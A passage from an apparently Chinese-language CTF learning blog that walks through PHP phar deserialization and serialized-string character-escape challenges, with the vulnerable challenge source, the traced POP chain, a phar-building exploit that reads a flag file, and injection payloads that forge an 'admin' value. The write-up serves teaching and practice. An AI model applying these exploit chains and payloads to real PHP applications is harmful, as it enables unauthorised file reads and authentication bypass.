punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Test类中存在敏感操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以反向推poc链</p><p>通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知<code>__get-&gt;get-&gt;file_get</code>，所以关键是触发<code>__get</code>方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的<code>__tostring</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发</span>   <span class="token punctuation">{</span>       <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下怎么能够触发<code>__toString()</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知要echo <code>test</code>即可</p><p>整条链子为</p><pre class="line-numbers language-none"><code class="language-none">C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成phar文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发头是C1e4r类</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改生成得phar文件后缀</p><p>上传成功后回到文件读取点来读phar文件</p><p>拿到base64加密得flag</p><p><img src="https://i.loli.net/2021/08/24/Whwx98G4yaKbvEL.png"></p><h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。</p><h2 id="二、字符变多"><a href="#二、字符变多" class="headerlink" title="二、字符变多"></a>二、字符变多</h2><p>例子：</p><p>该题源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token double-quoted-string string">"aaa"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件包含了<code>flag</code></p><p>然后<code>filter()</code>方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度</p><p>我们试着传入<code>u=admin</code></p><p>序列化为：</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:5:\"admin\";i:1;s:3:\"aaa\";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化后</p><p><img src="https://i.loli.net/2021/08/25/Gd4msifBVrgOcJQ.png"></p><p>a[1]不等于”admin” 没有满足条件</p><p>我们构造一下数组</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:1:"a";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我们只有一个参数<code>username</code>可控</p><p>可以利用字符串逃逸</p><p>复制自己想要构造的字符串</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照长度添加字符串，已知长度为19</p><p>则在前方填充19个x</p><pre class="line-numbers language-none"><code class="language-none">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:38:"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:5:"admin";}";i:1;s:1:"a";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经逃逸出来了</p><p>这里利用了序列化的特性</p><p>反序列化看一下</p><pre class="line-numbers language-成功逃逸" data-language="成功逃逸"><code class="language-成功逃逸">array(2) {  [0] =&gt;  string(38) "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"  [1] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以观察整个数据的变化</p><p><img src="https://i.loli.net/2021/08/25/1QgPb694Oia2cTU.png"></p><p>成功逃逸。获得flag</p><h2 id="三、字符变少"><a href="#三、字符变少" class="headerlink" title="三、字符变少"></a>三、字符变少</h2><p>也是拿一道题做例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$auth</span><span class="token operator">=</span><span class="token double-quoted-string string">"guest"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟上一道题差不多</p><p>先随意构造一下争取的payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后拿到所需部分</p><pre class="line-numbers language-none"><code class="language-none">";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要我们传入的payload</p><pre class="line-numbers language-none"><code class="language-none">u=xxx&amp;p=xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已知两个可控值中间的部分不变（可能会多一位）</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:1:"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以利用替换方法换成空值从而完成逃逸</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"secsecsecsec"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'";i:1;s:1:"p";i:2;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果</p><pre class="line-numbers language-none"><code class="language-none">a:3:{i:0;s:12:"secsecsecsec";i:1;s:31:"";i:1;s:1:"p";i:2;s:5:"admin";}";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经完成了逃逸</p><p>反序列化一下看看</p><pre class="line-numbers language-none"><code class="language-none">array(3) {  [0] =&gt;  string(12) "";i:1;s:31:""  [1] =&gt;  string(1) "p"  [2] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/25/lw4D1a3xpSjbrX7.png"></p><p>a[2]=admin 拿到flag</p><p><img src="https://i.loli.net/2021/08/25/aUcp47NDeqkvo93.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
